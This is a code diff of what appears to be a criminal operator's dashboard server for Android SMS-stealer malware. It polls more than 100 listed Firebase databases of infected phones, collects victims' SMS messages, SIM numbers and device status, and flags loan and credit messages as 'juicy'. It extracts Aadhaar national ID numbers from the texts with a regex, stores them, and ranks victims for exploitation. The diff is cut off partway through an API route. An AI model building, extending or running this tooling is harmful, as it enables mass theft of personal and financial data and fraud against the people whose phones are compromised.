@@ -7,9 +7,35 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express();
 const PORT = 3000;
 
-// ── Path to bot's working directory (where devices_database_*.json live) ──────
-const BOT_DIR     = process.env.BOT_DIR     || '/home/ubuntu/newp';
-const OLD_BOT_DIR = process.env.OLD_BOT_DIR || '/home/ubuntu';
+// ── Dashboard-owned data directory (no dependency on bot's working dir) ────────
+const DATA_DIR = path.join(__dirname, 'data');
+if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+
+const DB_FILE          = path.join(DATA_DIR, 'dashboard_db.json');
+const SIM_FILE         = path.join(DATA_DIR, 'sim_overrides.json');
+const NOTES_FILE       = path.join(DATA_DIR, 'device_notes.json');
+const AADHAR_FILE      = path.join(DATA_DIR, 'aadhar.json');
+
+// Poll interval: how often the background poller refreshes each target (ms)
+const POLL_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
+
+// ── Juicy keywords (mirrors DA1.py exactly) ───────────────────────────────────
+const JUICY_KEYWORDS = [
+  // Loan / credit apps
+  'kreditbee','creditbee','mpokket','navi','nira','moneyview',
+  'stucred','snapmint','pfin','poonawala','fincorp',
+  'aditya birla','adityabirla','flaxi','flexsalary','salaryday',
+  'rupee112','zestmoney','home credit','homecredit',
+  // Approval / offer keywords
+  'pre approved','pre-approved','preapproved',
+  'approved','loan approved','credit approved',
+  'increase limit','credit limit','limit increase',
+  // Repayment / overdue
+  'repayment','overdue','due amount','emi due','emi overdue',
+  'outstanding','payment due',
+  // Generic finance
+  'loan','credit card','bajaj','zype',
+];
 
 // ── OLD RAW_TARGETS from DAprevious.py ────────────────────────────────────────
 const OLD_RAW_TARGETS = [
@@ -43,53 +69,18 @@ const OLD_RAW_TARGETS = [
   [100,'https://samar84900-6f084-default-rtdb.firebaseio.com'],
 ];
 
-// Schema sets for OLD URLs (from DAprevious.py)
 const OLD_SCHEMA_2 = new Set([44, 52]);
 const OLD_SCHEMA_3 = new Set([23,27,32,33,37,40,45,46,56,65,66,68,69,70,72,73,100]);
 const OLD_SCHEMA_4 = new Set([31]);
-// All others → schema 1 (20,53,84,85,86,87,88,89)
-
 function getOldSchema(id) {
   if (OLD_SCHEMA_2.has(id)) return 2;
   if (OLD_SCHEMA_3.has(id)) return 3;
   if (OLD_SCHEMA_4.has(id)) return 4;
   return 1;
 }
-
 const OLD_TARGETS = OLD_RAW_TARGETS.map(([id, url]) => ({
-  id, url: url.replace(/\/$/, ''), schema: getOldSchema(id)
+  id, url: url.replace(/\/$/, ''), schema: getOldSchema(id), isOld: true
 }));
-
-function loadOldDb(targetId) {
-  const file = path.join(OLD_BOT_DIR, `devices_database_${targetId}.json`);
-  try {
-    if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, 'utf8'));
-  } catch {}
-  return {};
-}
-
-function summariseOldTarget(target) {
-  const devices = loadOldDb(target.id);
-  const deviceList = Object.entries(devices);
-  const total = deviceList.length;
-  let online = 0, juicyCount = 0;
-  let oldestActivity = null, newestActivity = null;
-  for (const [, dev] of deviceList) {
-    if (dev.current_status === 'online') online++;
-    if ((dev.juicy_keywords || []).length > 0) juicyCount++;
-    const act = parseLastActivity(dev.last_activity);
-    if (act) {
-      if (!oldestActivity || act < oldestActivity) oldestActivity = act;
-      if (!newestActivity || act > newestActivity) newestActivity = act;
-    }
-  }
-  return {
-    id: target.id, url: target.url, schema: target.schema,
-    total, online, offline: total - online, juicyCount,
-    oldestSms: oldestActivity ? oldestActivity.toISOString().slice(0,10) : null,
-    newestSms: newestActivity ? newestActivity.toISOString().slice(0,10) : null,
-  };
-}
 
 // ── RAW_TARGETS from DA1.py ───────────────────────────────────────────────────
 const RAW_TARGETS = [
@@ -165,7 +156,6 @@ const RAW_TARGETS = [
   [77,'https://u25783858-e6739-default-rtdb.firebaseio.com'],
   [78,'https://u62751482-f5b46-default-rtdb.firebaseio.com'],
   [79,'https://u8208372-ad1d1-default-rtdb.firebaseio.com'],
-  // New URLs (80-97) — schema verified live
   [80,'https://tinmm88-b7db5-default-rtdb.firebaseio.com'],
   [81,'https://e9turnament1-default-rtdb.firebaseio.com'],
   [82,'https://raaz-5287d-default-rtdb.firebaseio.com'],
@@ -186,9 +176,8 @@ const RAW_TARGETS = [
   [97,'https://rahais-default-rtdb.firebaseio.com'],
 ];
 
-// ── Schema assignment (mirrors DA1.py MultiTargetManager) ─────────────────────
-const SCHEMA_2  = new Set([14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,46,71,73,
-                            81,83,90,92,94,97]);
+// ── Schema assignment ─────────────────────────────────────────────────────────
+const SCHEMA_2  = new Set([14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,46,71,73,81,83,90,92,94,97]);
 const SCHEMA_3  = new Set([32,33,34,35,36,37,55,56,66,67,68,69,72,77,79]);
 const SCHEMA_4  = new Set([42,43,44,45,49,50,51,52]);
 const SCHEMA_5  = new Set([58]);
@@ -221,10 +210,402 @@ function getSchema(id) {
   return 1;
 }
 
-// Build target list
 const TARGETS = RAW_TARGETS.map(([id, url]) => ({
-  id, url: url.replace(/\/$/, ''), schema: getSchema(id)
+  id, url: url.replace(/\/$/, ''), schema: getSchema(id), isOld: false
 }));
+
+const ALL_TARGETS = [...TARGETS, ...OLD_TARGETS];
+
+// ── Dashboard DB: load / save ─────────────────────────────────────────────────
+// Structure: { new: { [targetId]: { [deviceId]: deviceRecord } },
+//              old: { [targetId]: { [deviceId]: deviceRecord } } }
+// deviceRecord mirrors DA1.py fields exactly.
+let dashboardDb = { new: {}, old: {} };
+
+function loadDashboardDb() {
+  try {
+    if (fs.existsSync(DB_FILE)) dashboardDb = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
+  } catch (e) {
+    console.error('DB load error:', e.message);
+  }
+  // Ensure both sections exist
+  if (!dashboardDb.new) dashboardDb.new = {};
+  if (!dashboardDb.old) dashboardDb.old = {};
+}
+
+function saveDashboardDb() {
+  try {
+    fs.writeFileSync(DB_FILE, JSON.stringify(dashboardDb, null, 2));
+  } catch (e) {
+    console.error('DB save error:', e.message);
+  }
+}
+
+function getTargetDb(target) {
+  const section = target.isOld ? 'old' : 'new';
+  const key = String(target.id);
+  if (!dashboardDb[section][key]) dashboardDb[section][key] = {};
+  return dashboardDb[section][key];
+}
+
+// Update a single device record — never removes juicy_keywords already stored
+function upsertDevice(target, deviceId, fields) {
+  const db = getTargetDb(target);
+  const now = new Date().toISOString().replace('T', ' ').slice(0, 16);
+  const existing = db[deviceId] || {};
+
+  // Merge juicy keywords: accumulate, never delete
+  const oldKws = new Set(existing.juicy_keywords || []);
+  const newKws = fields.juicy_keywords || [];
+  for (const kw of newKws) oldKws.add(kw);
+
+  // Track status transitions
+  const wasOnline = existing.current_status === 'online';
+  const isOnline  = fields.current_status === 'online';
+  const last_online  = isOnline  ? now : (existing.last_online  || null);
+  const last_offline = !isOnline ? now : (existing.last_offline || null);
+
+  db[deviceId] = {
+    brand:         fields.brand         || existing.brand         || 'Unknown',
+    device_id:     deviceId,
+    sim1_number:   fields.sim1_number   || existing.sim1_number   || 'N/A',
+    sim2_number:   fields.sim2_number   || existing.sim2_number   || 'N/A',
+    sim1_enriched: fields.sim1_enriched || existing.sim1_enriched || [],
+    sim2_enriched: fields.sim2_enriched || existing.sim2_enriched || [],
+    juicy_keywords: [...oldKws],
+    current_status: fields.current_status || 'offline',
+    last_battery:  fields.last_battery  || existing.last_battery  || 'N/A',
+    last_activity: fields.last_activity || existing.last_activity || null,
+    last_online,
+    last_offline,
+    app_id:        fields.app_id        || existing.app_id        || 'N/A',
+    obj_id:        fields.obj_id        || existing.obj_id        || 'N/A',
+    user_serial:   fields.user_serial   || existing.user_serial   || 'N/A',
+  };
+}
+
+// ── Firebase fetch helpers ────────────────────────────────────────────────────
+async function fbFetch(url) {
+  const resp = await fetch(url, {
+    headers: { 'User-Agent': 'Mozilla/5.0' },
+    signal: AbortSignal.timeout(25000),
+  });
+  if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+  const text = await resp.text();
+  if (!text || text[0] === '<') throw new Error('HTML response (auth error)');
+  return JSON.parse(text);
+}
+
+// Iterate SMS messages from arbitrary nested Firebase data
+function* iterMsgs(data) {
+  if (!data || typeof data !== 'object') return;
+  for (const v of Object.values(data)) {
+    if (!v || typeof v !== 'object') continue;
+    if ('body' in v || 'message' in v || 'msg' in v || 'text' in v) yield v;
+    else yield* iterMsgs(v);
+  }
+}
+
+// Extract last_activity timestamp string and juicy keywords from an SMS collection
+function parseSms(dsms, schema) {
+  const tsList = [];
+  const foundKws = new Set();
+  const AADHAR_RE = /(?<!\d)([2-9]\d{11})(?!\d)/g;
+  const AADHAR_KW = /aadh[a]?ar/i;
+  const foundAadhars = new Set();
+
+  const msgs = dsms && typeof dsms === 'object'
+    ? (Array.isArray(dsms) ? dsms : Object.values(dsms))
+    : [];
+
+  for (const msg of msgs) {
+    if (!msg || typeof msg !== 'object') continue;
+    let body = '', ts = 0;
+
+    if ([2, 4, 10, 11].includes(schema)) {
+      body = String(msg.message || msg.body || '');
+      const dtStr = msg.dateTime || '';
+      if (dtStr) {
+        try {
+          // "DD-MM-YYYY | HH:MM AM/PM"
+          const [datePart, timePart] = dtStr.split(' | ');
+          ts = new Date(`${datePart.split('-').reverse().join('-')} ${timePart}`).getTime() || 0;
+        } catch {}
+      }
+    } else if (schema === '8a' || schema === '8b') {
+      body = String(msg.msg || '');
+      ts = Number(msg.date) || 0;
+    } else if (schema === 12) {
+      body = String(msg.text || '');
+      ts = Number(msg.rawTs || msg.timestamp) || 0;
+    } else if (schema === 13) {
+      body = String(msg.message || msg.body || '');
+      ts = Number(msg.timestamp || msg.timestampMillis) || 0;
+    } else {
+      body = String(msg.body || msg.message || msg.msg || msg.text || '');
+      ts = Number(msg.timestampMillis || msg.timestamp) || 0;
+    }
+
+    const lower = body.toLowerCase();
+    for (const kw of JUICY_KEYWORDS) {
+      if (lower.includes(kw)) foundKws.add(kw);
+    }
+    if (AADHAR_KW.test(lower)) {
+      for (const m of body.matchAll(AADHAR_RE)) foundAadhars.add(m[1]);
+    }
+    if (ts > 0) tsList.push(ts);
+  }
+
+  const maxTs = tsList.length ? Math.max(...tsList) : 0;
+  const actStr = maxTs
+    ? new Date(maxTs).toISOString().replace('T', ' ').slice(0, 16)
+    : 'Unknown';
+
+  return { actStr, foundKws: [...foundKws], foundAadhars: [...foundAadhars], maxTs };
+}
+
+// ── Per-target Firebase poll ──────────────────────────────────────────────────
+async function pollTarget(target) {
+  const { id, url, schema, isOld } = target;
+  const now = Date.now();
+  const STALE = 30 * 60 * 1000; // 30 min online threshold
+
+  try {
+    // ── Determine main endpoint ──────────────────────────────────────────────
+    let mainEP;
+    if (schema === 1)                              mainEP = `${url}/All_Users.json`;
+    else if (schema === 2 || schema === 4)         mainEP = `${url}/clients.json`;
+    else if (schema === 3)                         mainEP = `${url}/user_data.json`;
+    else if (schema === 5)                         mainEP = `${url}/devices.json`;
+    else if (schema === 6)                         mainEP = `${url}/data.json`;
+    else if (schema === '8a')                      mainEP = `${url}/omex.json`;
+    else if (['8b',9,10,11,14,15].includes(schema)) mainEP = `${url}/.json`;
+    else if (schema === 12)                        mainEP = `${url}/devices.json`;
+    else if (schema === 13)                        mainEP = `${url}/admin.json`;
+    else                                           mainEP = `${url}/All_Users.json`;
+
+    const data = await fbFetch(mainEP);
+    if (!data) return;
+
+    // ── Extract device map + SMS/SIM maps per schema ─────────────────────────
+    let rawDevs = {}, allSms = {}, allSims = {};
+
+    if (schema === 1) {
+      rawDevs = data?.Data?.DeviceInfo || {};
+      allSms  = data?.Data?.Sms        || {};
+      allSims = data?.Data?.SimINFO    || {};
+    } else if (schema === '8a') {
+      rawDevs = data?.All_User?.Info   || {};
+      allSms  = data?.All_User?.Sms    || {};
+      allSims = data?.All_User?.SimINFO|| {};
+    } else if (schema === '8b') {
+      rawDevs = data?.omex?.All_User?.Info    || {};
+      allSms  = data?.omex?.All_User?.Sms     || {};
+      allSims = data?.omex?.All_User?.SimINFO || {};
+    } else if (schema === 9) {
+      rawDevs = data?.user_data || {};
+      allSms  = data?.user_sms  || {};
+    } else if (schema === 10) {
+      rawDevs = data?.clients  || {};
+      allSms  = data?.messages || {};
+    } else if (schema === 11) {
+      rawDevs = data?.clients  || {};
+      allSms  = data?.messages || {};
+    } else if (schema === 14) {
+      const ud = data?.user_data || {};
+      const cl = data?.clients   || {};
+      for (const [k,v] of Object.entries(ud)) if (v && typeof v==='object') rawDevs[k] = {...v, _src:'user_data'};
+      for (const [k,v] of Object.entries(cl)) if (!rawDevs[k] && v && typeof v==='object') rawDevs[k] = {...v, _src:'clients'};
+      allSms = data?.user_sms || data?.messages || {};
+    } else if (schema === 15) {
+      const users = data?.users || {};
+      for (const [,u] of Object.entries(users)) if (u?.DeviceId) rawDevs[u.DeviceId] = u;
+    } else if (schema === 13) {
+      for (const av of Object.values(data || {})) {
+        if (av?.users) for (const [uid, ud] of Object.entries(av.users)) if (ud) rawDevs[uid] = ud;
+      }
+    } else {
+      rawDevs = (data && typeof data === 'object') ? data : {};
+    }
+
+    // ── Process each device ──────────────────────────────────────────────────
+    for (const [did, dinfo] of Object.entries(rawDevs)) {
+      if (!dinfo || typeof dinfo !== 'object') continue;
+
+      // Get SMS for this device
+      let dsms = allSms[did] || {};
+      // For schema 8a/8b use actual_did
+      let actualDid = did;
+      if (schema === '8a' || schema === '8b') {
+        actualDid = dinfo.did || did;
+        dsms = allSms[actualDid] || allSms[did] || {};
+      }
+      // Schema 13: SMS is nested under receivedSms key inside the device record
+      if (schema === 13) dsms = dinfo.receivedSms || {};
+
+      const { actStr, foundKws, foundAadhars, maxTs } = parseSms(dsms, schema);
+      const STALE_MS = 30 * 60 * 1000;
+
+      // ── Extract fields per schema (mirrors DA1.py exactly) ────────────────
+      let s1 = 'N/A', s2 = 'N/A', bat = 'N/A', brand = 'Unknown', isOn = false;
+      let appId = 'N/A', objId = 'N/A', userSerial = 'N/A';
+
+      if (schema === 1) {
+        const devSims = allSims[did] || {};
+        s1     = devSims.sim1Number || 'N/A';
+        s2     = devSims.sim2Number || 'N/A';
+        bat    = dinfo.Battery || 'N/A';
+        brand  = dinfo.Brand   || 'Unknown';
+        isOn   = dinfo.Status === 'Online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+        appId  = dinfo.appId || 'N/A';
+        objId  = dinfo.objId || did;
+
+      } else if (schema === '8a' || schema === '8b') {
+        const devSims = allSims[actualDid] || allSims[did] || {};
+        const r1 = String(devSims.sim1 || 'N/A');
+        const r2 = String(devSims.sim2 || 'N/A');
+        s1    = r1 !== 'N/A' ? r1.split(' - ')[0].trim() : 'N/A';
+        s2    = r2 !== 'N/A' ? r2.split(' - ')[0].trim() : 'N/A';
+        bat   = dinfo.Battery || 'N/A';
+        brand = dinfo.Name    || 'Unknown';
+        isOn  = dinfo.status === 'Online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+        objId = actualDid;
+
+      } else if (schema === 9) {
+        s1    = dinfo.phoneNumber || 'N/A';
+        s2    = 'N/A';
+        const bv = dinfo.battery;
+        bat   = bv != null && bv !== 'N/A' ? (String(bv).endsWith('%') ? String(bv) : `${bv}%`) : 'N/A';
+        brand = dinfo.d_name || 'Unknown';
+        isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+
+      } else if (schema === 2 || schema === 4) {
+        const sims = dinfo.sims || [];
+        s1    = sims[0]?.phoneNumber || dinfo.mobNo || 'N/A';
+        s2    = sims[1]?.phoneNumber || 'N/A';
+        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
+        brand = dinfo.modelName || 'Unknown';
+        isOn  = dinfo.status === true || dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+
+      } else if (schema === 3 || schema === 6) {
+        s1    = dinfo.numberSim1 || dinfo.phoneNumber || 'N/A';
+        s2    = dinfo.numberSim2 || 'N/A';
+        bat   = dinfo.battery != null ? `${dinfo.battery}%` : 'N/A';
+        brand = dinfo.d_name || 'Unknown';
+        isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+
+      } else if (schema === 5) {
+        const info = dinfo.info || {};
+        s1    = info.sim1 || dinfo.sim1 || dinfo.phoneNumber || 'N/A';
+        s2    = info.sim2 || dinfo.sim2 || 'N/A';
+        bat   = info.battery || dinfo.battery || dinfo.Battery || 'N/A';
+        brand = info.model || info.brand || dinfo.brand || dinfo.Brand || dinfo.modelName || 'Unknown';
+        isOn  = ['Online','online',true].includes(dinfo.status) || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+
+      } else if (schema === 10) {
+        // Try to find phone from outgoing SMS sender
+        for (const msg of (typeof dsms === 'object' ? Object.values(dsms) : [])) {
+          if (msg?.type === 'outgoing') {
+            const d = String(msg.sender || '').replace(/\D/g,'');
+            if (d.length >= 10) { s1 = d.slice(-10); break; }
+          }
+        }
+        bat = 'N/A'; brand = 'Unknown';
+        isOn = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;
+
+      } else if (schema === 11) {
+        s1    = dinfo.mobNo || 'N/A';
+        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
+        brand = dinfo.modelName || dinfo.Brand || 'Unknown';
+        isOn  = dinfo.status === true || dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+
+      } else if (schema === 12) {
+        const hero = dinfo.hero || {};
+        const info = dinfo.info || {};
+        s1    = String(hero.number || 'N/A');
+        s2    = String(dinfo.number_2 || dinfo.forward || 'N/A');
+        bat   = 'N/A';
+        brand = info.model || 'Unknown';
+        isOn  = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;
+
+      } else if (schema === 13) {
+        const di = dinfo.deviceInfo || {};
+        const si = dinfo.simInfo    || {};
+        const sim1o = si.sim1 || si.sim0 || {};
+        const sim2o = si.sim2 || {};
+        s1    = String(sim1o.number || 'N/A');
+        s2    = String(sim2o.number || 'N/A');
+        bat   = 'N/A';
+        brand = di.model || di.brand || 'Unknown';
+        isOn  = maxTs > 0 && (Date.now() - maxTs) < STALE_MS;
+
+      } else if (schema === 14) {
+        if (dinfo._src === 'user_data') {
+          s1    = dinfo.phoneNumber || 'N/A';
+          const bv = dinfo.battery;
+          bat   = bv != null && bv !== 'N/A' ? (String(bv).endsWith('%') ? String(bv) : `${bv}%`) : 'N/A';
+          brand = dinfo.d_name || 'Unknown';
+        } else {
+          const sims = dinfo.sims || [];
+          s1    = sims[0]?.phoneNumber || dinfo.mobNo || 'N/A';
+          s2    = sims[1]?.phoneNumber || 'N/A';
+          bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
+          brand = dinfo.modelName || 'Unknown';
+        }
+        isOn = ['online','Online',true].includes(dinfo.status) || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+
+      } else if (schema === 15) {
+        s1    = String(dinfo.Phone || 'N/A');
+        bat   = String(dinfo.Battery || 'N/A');
+        brand = dinfo.Brand || 'Unknown';
+        isOn  = dinfo.Status === 'Online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+      }
+
+      upsertDevice(target, actualDid, {
+        brand, last_battery: bat, sim1_number: s1, sim2_number: s2,
+        current_status: isOn ? 'online' : 'offline',
+        last_activity: actStr !== 'Unknown' ? actStr : null,
+        juicy_keywords: foundKws,
+        app_id: appId, obj_id: objId, user_serial: userSerial,
+        sim1_enriched: [], sim2_enriched: [],
+      });
+
+      // Persist aadhaar numbers found in SMS
+      if (foundAadhars.length > 0) {
+        const adb = loadAadharDb();
+        const urlKey = String(id);
+        if (!adb[urlKey]) adb[urlKey] = {};
+        const existing = new Set(adb[urlKey][actualDid] || []);
+        for (const n of foundAadhars) existing.add(n);
+        adb[urlKey][actualDid] = [...existing];
+        saveAadharDb(adb);
+      }
+    }
+
+    saveDashboardDb();
+    console.log(`[poll] ${isOld ? 'old' : 'new'} #${id} — ${Object.keys(getTargetDb(target)).length} devices`);
+
+  } catch (e) {
+    // Non-fatal: log and move on
+    console.warn(`[poll] ${isOld ? 'old' : 'new'} #${id} error: ${e.message}`);
+  }
+}
+
+// ── Background poller: stagger polls to avoid hammering Firebase ──────────────
+async function runPoller() {
+  console.log('[poller] Starting background poll for all targets...');
+  // Stagger: 1 target every 2 seconds on first run
+  for (let i = 0; i < ALL_TARGETS.length; i++) {
+    setTimeout(() => pollTarget(ALL_TARGETS[i]), i * 2000);
+  }
+  // Then repeat every POLL_INTERVAL_MS
+  setInterval(async () => {
+    console.log('[poller] Refreshing all targets...');
+    for (let i = 0; i < ALL_TARGETS.length; i++) {
+      setTimeout(() => pollTarget(ALL_TARGETS[i]), i * 2000);
+    }
+  }, POLL_INTERVAL_MS);
+}
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 function extract10Digits(raw) {
@@ -235,45 +616,58 @@ function extract10Digits(raw) {
 
 function getSmsLink(target, deviceId, objId) {
   const { url, schema } = target;
-  const did = deviceId;
-  if (schema === 1)    return `${url}/All_Users/sms/${did}.json?print=pretty`;
-  if ([2,4,5,15,10,11].includes(schema)) return `${url}/messages/${did}.json?print=pretty`;
+  if (schema === 1)    return `${url}/All_Users/sms/${deviceId}.json?print=pretty`;
+  if ([2,4,5,15,10,11].includes(schema)) return `${url}/messages/${deviceId}.json?print=pretty`;
   if (schema === '8a' || schema === '8b') {
-    const actual = (objId && objId !== 'N/A') ? objId : did;
+    const actual = (objId && objId !== 'N/A') ? objId : deviceId;
     return `${url}/omex/All_User/Sms/${actual}.json?print=pretty`;
   }
-  if ([3,6,9,14].includes(schema)) return `${url}/user_sms/${did}.json?print=pretty`;
-  if (schema === 12)   return `${url}/profex_incoming/${did}.json?print=pretty`;
+  if ([3,6,9,14].includes(schema)) return `${url}/user_sms/${deviceId}.json?print=pretty`;
+  if (schema === 12)   return `${url}/profex_incoming/${deviceId}.json?print=pretty`;
   if (schema === 13)   return `${url}/admin.json?print=pretty`;
-  return `${url}/user_sms/${did}.json?print=pretty`;
-}
-
-// ── Aadhar DB: loaded once, refreshed on each /api/url/:id call ──────────────
-const AADHAR_FILE = path.join(BOT_DIR, 'aadhar.json');
-function loadAadharDb() {
-  try {
-    if (fs.existsSync(AADHAR_FILE)) return JSON.parse(fs.readFileSync(AADHAR_FILE, 'utf8'));
-  } catch {}
-  return {};
-}
-
-function loadDb(targetId) {
-  const file = path.join(BOT_DIR, `devices_database_${targetId}.json`);
-  try {
-    if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, 'utf8'));
-  } catch {}
-  return {};
+  return `${url}/user_sms/${deviceId}.json?print=pretty`;
 }
 
 function parseLastActivity(actStr) {
-  // "2026-06-14 10:08" → Date
   if (!actStr || actStr === 'Unknown') return null;
   try { return new Date(actStr); } catch { return null; }
 }
 
+// ── DB accessors ──────────────────────────────────────────────────────────────
+function loadAadharDb() {
+  try { if (fs.existsSync(AADHAR_FILE)) return JSON.parse(fs.readFileSync(AADHAR_FILE, 'utf8')); }
+  catch {}
+  return {};
+}
+function saveAadharDb(data) {
+  try { fs.writeFileSync(AADHAR_FILE, JSON.stringify(data, null, 2)); }
+  catch (e) { console.error('Aadhar DB save error:', e.message); }
+}
+
+function loadSimOverrides() {
+  try { if (fs.existsSync(SIM_FILE)) return JSON.parse(fs.readFileSync(SIM_FILE, 'utf8')); }
+  catch {}
+  return {};
+}
+function saveSimOverrides(data) {
+  try { fs.writeFileSync(SIM_FILE, JSON.stringify(data, null, 2)); }
+  catch (e) { console.error('SIM overrides save error:', e.message); }
+}
+
+function loadNotes() {
+  try { if (fs.existsSync(NOTES_FILE)) return JSON.parse(fs.readFileSync(NOTES_FILE, 'utf8')); }
+  catch {}
+  return {};
+}
+function saveNotesFile(notes) {
+  try { fs.writeFileSync(NOTES_FILE, JSON.stringify(notes, null, 2)); }
+  catch (e) { console.error('Notes save error:', e.message); }
+}
+
+// ── Summarise a target from dashboard DB ─────────────────────────────────────
 function summariseTarget(target) {
-  const devices = loadDb(target.id);
-  const deviceList = Object.entries(devices);
+  const db = getTargetDb(target);
+  const deviceList = Object.entries(db);
   const total = deviceList.length;
   let online = 0, juicyCount = 0, withSim1 = 0, withSim2 = 0;
   let oldestActivity = null, newestActivity = null;
@@ -291,18 +685,48 @@ function summariseTarget(target) {
   }
 
   return {
-    id: target.id,
-    url: target.url,
-    schema: target.schema,
-    total,
-    online,
-    offline: total - online,
-    juicyCount,
-    withSim1,
-    withSim2,
+    id: target.id, url: target.url, schema: target.schema, total, online,
+    offline: total - online, juicyCount, withSim1, withSim2,
     oldestSms: oldestActivity ? oldestActivity.toISOString().slice(0,10) : null,
     newestSms: newestActivity ? newestActivity.toISOString().slice(0,10) : null,
   };
+}
+
+function buildDeviceList(target, devices, simOverrides, aadharDb) {
+  const simForUrl   = simOverrides[String(target.id)] || {};
+  const aadharForUrl = aadharDb[String(target.id)]   || {};
+
+  return Object.entries(devices)
+    .map(([deviceId, dev]) => ({
+      deviceId,
+      brand:         dev.brand          || 'Unknown',
+      status:        dev.current_status || 'offline',
+      battery:       dev.last_battery   || 'N/A',
+      lastActivity:  dev.last_activity  || null,
+      smsDate:       dev.last_activity  || null,
+      lastOnline:    dev.last_online    || null,
+      sim1:          dev.sim1_number    || 'N/A',
+      sim2:          dev.sim2_number    || 'N/A',
+      sim1Clean:     extract10Digits(simForUrl[deviceId]?.sim1 || dev.sim1_number),
+      sim2Clean:     extract10Digits(simForUrl[deviceId]?.sim2 || dev.sim2_number),
+      sim1Override:  simForUrl[deviceId]?.sim1 || '',
+      sim2Override:  simForUrl[deviceId]?.sim2 || '',
+      juicyKeywords: dev.juicy_keywords || [],
+      appId:         dev.app_id         || 'N/A',
+      objId:         dev.obj_id         || 'N/A',
+      userSerial:    dev.user_serial    || 'N/A',
+      sim1Enriched:  dev.sim1_enriched  || [],
+      sim2Enriched:  dev.sim2_enriched  || [],
+      smsLink:       getSmsLink(target, deviceId, dev.obj_id),
+      hasAadhaar:    !!(aadharForUrl[deviceId]?.length),
+      aadhaarNums:   aadharForUrl[deviceId] || [],
+    }))
+    .sort((a, b) => {
+      if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
+      if (b.juicyKeywords.length !== a.juicyKeywords.length)
+        return b.juicyKeywords.length - a.juicyKeywords.length;
+      return 0;
+    });
 }
 
 // ── API routes ────────────────────────────────────────────────────────────────
@@ -311,49 +735,206 @@ app.get('/api/urls', (req, res) => {
   res.json(summaries);
 });
 
-// ── OLD URLs API routes ───────────────────────────────────────────────────────
 app.get('/api/old/urls', (req, res) => {
-  res.json(OLD_TARGETS.map(t => summariseOldTarget(t)).filter(t => t.total > 0));
+  const summaries = OLD_TARGETS.map(t => summariseTarget(t)).filter(t => t.total > 0);
+  res.json(summaries);
+});
+
+app.get('/api/url/:id', (req, res) => {
+  const id = parseInt(req.params.id);
+  const target = TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'Not found' });
+  const devices     = getTargetDb(target);
+  const simOverrides = loadSimOverrides();
+  const aadharDb    = loadAadharDb();
+  const deviceList  = buildDeviceList(target, devices, simOverrides, aadharDb);
+  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
 });
 
 app.get('/api/old/url/:id', (req, res) => {
   const id = parseInt(req.params.id);
   const target = OLD_TARGETS.find(t => t.id === id);
   if (!target) return res.status(404).json({ error: 'Not found' });
-
-  const devices = loadOldDb(id);
+  const devices     = getTargetDb(target);
   const simOverrides = loadSimOverrides();
-  const simForUrl = simOverrides[`old_${id}`] || {};
-
-  const deviceList = Object.entries(devices)
-    .map(([deviceId, dev]) => ({
-      deviceId,
-      brand:        dev.brand || 'Unknown',
-      status:       dev.current_status || 'offline',
-      battery:      dev.last_battery || 'N/A',
-      lastActivity: dev.last_activity || null,
-      lastOnline:   dev.last_online || null,
-      sim1:         dev.sim1_number || 'N/A',
-      sim2:         dev.sim2_number || 'N/A',
-      sim1Clean:    extract10Digits(simForUrl[deviceId]?.sim1 || dev.sim1_number),
-      sim2Clean:    extract10Digits(simForUrl[deviceId]?.sim2 || dev.sim2_number),
-      sim1Override: simForUrl[deviceId]?.sim1 || '',
-      sim2Override: simForUrl[deviceId]?.sim2 || '',
-      juicyKeywords: dev.juicy_keywords || [],
-      appId:        dev.app_id || 'N/A',
-      objId:        dev.obj_id || 'N/A',
-      hasAadhaar:   false,
-      aadhaarNums:  [],
-      smsLink:      getSmsLink(target, deviceId, dev.obj_id),
-    }))
-    .sort((a, b) => {
-      if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
-      if (b.juicyKeywords.length !== a.juicyKeywords.length)
-        return b.juicyKeywords.length - a.juicyKeywords.length;
-      return 0;
-    });
-
+  const aadharDb    = loadAadharDb();
+  const deviceList  = buildDeviceList(target, devices, simOverrides, aadharDb);
   res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
+});
+
+// ── Force-refresh a single target immediately ─────────────────────────────────
+app.post('/api/url/:id/refresh', async (req, res) => {
+  const id = parseInt(req.params.id);
+  const target = TARGETS.find(t => t.id === id) || OLD_TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'Not found' });
+  await pollTarget(target);
+  res.json({ ok: true, devices: Object.keys(getTargetDb(target)).length });
+});
+
+// ── Live fetch (bypasses DB — used by refreshAll in frontend) ─────────────────
+app.get('/api/url/:id/live', async (req, res) => {
+  const id = parseInt(req.params.id);
+  const target = TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'Not found' });
+  await pollTarget(target);
+  const db = getTargetDb(target);
+  const devices = Object.entries(db).map(([deviceId, d]) => ({
